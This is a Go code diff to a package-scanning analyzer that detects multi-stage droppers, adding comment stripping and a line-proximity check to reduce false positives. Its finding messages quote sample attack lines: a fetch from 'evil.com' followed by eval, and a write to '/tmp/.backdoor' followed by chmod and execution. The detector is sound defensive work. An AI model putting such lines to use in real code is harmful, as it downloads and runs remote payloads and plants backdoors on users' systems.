@@ -39,47 +39,59 @@ var (
 func (a *MultiStageLoaderAnalyzer) scanContent(content string, filename string) []Finding {
 	var findings []Finding
 
-	hasNetworkFetch := networkFetchPattern.MatchString(content)
-	hasDynamicExec := dynamicExecPattern.MatchString(content)
-	hasFileWrite := fileWritePattern.MatchString(content)
-	hasDynamicImport := dynamicImportPattern.MatchString(content)
-	hasChmodExec := chmodExecPattern.MatchString(content)
+	// Strip comments to reduce false positives
+	strippedContent := StripComments(content)
+
+	hasNetworkFetch := networkFetchPattern.MatchString(strippedContent)
+	hasDynamicExec := dynamicExecPattern.MatchString(strippedContent)
+	hasFileWrite := fileWritePattern.MatchString(strippedContent)
+	hasDynamicImport := dynamicImportPattern.MatchString(strippedContent)
+	hasChmodExec := chmodExecPattern.MatchString(strippedContent)
 
 	// Stage 1: Fetch from network + eval/exec (classic dropper)
 	if hasNetworkFetch && hasDynamicExec {
-		findings = append(findings, Finding{
-			Analyzer:    a.Name(),
-			Title:       "Multi-stage loader: remote fetch and execute",
-			Description: fmt.Sprintf("File %q fetches remote content and executes it dynamically. This is a classic multi-stage dropper that downloads payloads from command-and-control servers.", filename),
-			Severity:    SeverityCritical,
-			ExploitExample: "Multi-stage dropper:\n" +
-				"    const code = await fetch('https://evil.com/stage2.js').then(r => r.text());\n" +
-				"    eval(code); // Stage 2 downloads stage 3...\n" +
-				"    Each stage can evade static analysis by loading dynamically.",
-			Remediation: "This is a remote code execution dropper. Investigate the URL and remove the package.",
-		})
+		// Verify proximity to reduce false positives in large files
+		if a.areOperationsClose(strippedContent, networkFetchPattern, dynamicExecPattern, 20) {
+			findings = append(findings, Finding{
+				Analyzer:    a.Name(),
+				Title:       "Multi-stage loader: remote fetch and execute",
+				Description: fmt.Sprintf("File %q fetches remote content and executes it dynamically in close proximity. This is a classic multi-stage dropper pattern.", filename),
+				Severity:    SeverityCritical,
+				ExploitExample: "Multi-stage dropper:\n" +
+					"    const code = await fetch('https://evil.com/stage2.js').then(r => r.text());\n" +
+					"    eval(code); // Stage 2 downloads stage 3...\n" +
+					"    Each stage can evade static analysis by loading dynamically.",
+				Remediation: "This is a remote code execution dropper. Investigate the URL and remove the package.",
+			})
+		}
 	}
 
 	// File-drop-and-execute
 	if hasFileWrite && (hasDynamicExec || hasChmodExec) {
-		findings = append(findings, Finding{
-			Analyzer:    a.Name(),
-			Title:       "Dropper: write-to-disk and execute",
-			Description: fmt.Sprintf("File %q writes data to disk and then executes it. This is a file-dropping technique that installs persistent backdoors.", filename),
-			Severity:    SeverityCritical,
-			ExploitExample: "File dropper:\n" +
-				"    fs.writeFileSync('/tmp/.backdoor', payload);\n" +
-				"    execSync('chmod +x /tmp/.backdoor && /tmp/.backdoor');\n" +
-				"    Writes binary to temp location and executes.",
-			Remediation: "Investigate what is being written to disk and executed. Check for base64-encoded payloads.",
-		})
+		// Verify proximity
+		closeToExec := a.areOperationsClose(strippedContent, fileWritePattern, dynamicExecPattern, 20)
+		closeToChmod := a.areOperationsClose(strippedContent, fileWritePattern, chmodExecPattern, 20)
+
+		if closeToExec || closeToChmod {
+			findings = append(findings, Finding{
+				Analyzer:    a.Name(),
+				Title:       "Dropper: write-to-disk and execute",
+				Description: fmt.Sprintf("File %q writes data to disk and then executes it in close proximity. This is a file-dropping technique that installs persistent backdoors.", filename),
+				Severity:    SeverityCritical,
+				ExploitExample: "File dropper:\n" +
+					"    fs.writeFileSync('/tmp/.backdoor', payload);\n" +
+					"    execSync('chmod +x /tmp/.backdoor && /tmp/.backdoor');\n" +
+					"    Writes binary to temp location and executes.",
+				Remediation: "Investigate what is being written to disk and executed. Check for base64-encoded payloads.",
+			})
+		}
 	}
 
 	// Dynamic import() from URL (ESM loader)
 	if hasDynamicImport {
 		// Check if the import uses a URL or variable (not a static string path)
-		if strings.Contains(content, "import(url") || strings.Contains(content, "import(endpoint") ||
-			strings.Contains(content, "import('http") || strings.Contains(content, `import("http`) {
+		if strings.Contains(strippedContent, "import(url") || strings.Contains(strippedContent, "import(endpoint") ||
+			strings.Contains(strippedContent, "import('http") || strings.Contains(strippedContent, `import("http`) {
 			findings = append(findings, Finding{
 				Analyzer:    a.Name(),
 				Title:       "Dynamic import from remote URL",
@@ -95,4 +107,34 @@ func (a *MultiStageLoaderAnalyzer) scanContent(content string, filename string) 
 	}
 
 	return findings
+}
+
+// areOperationsClose checks if two patterns appear within a certain number of lines of each other.
+func (a *MultiStageLoaderAnalyzer) areOperationsClose(content string, p1, p2 *regexp.Regexp, maxDistance int) bool {
+	lines := strings.Split(content, "\n")
+	p1Lines := []int{}
+	p2Lines := []int{}
+
+	for i, line := range lines {
+		if p1.MatchString(line) {
+			p1Lines = append(p1Lines, i)
+		}
+		if p2.MatchString(line) {
+			p2Lines = append(p2Lines, i)
+		}
+	}
+
+	for _, l1 := range p1Lines {
+		for _, l2 := range p2Lines {
+			diff := l1 - l2
+			if diff < 0 {
+				diff = -diff
+			}
+			if diff <= maxDistance {
+				return true
+			}
+		}
+	}
+
+	return false
 }
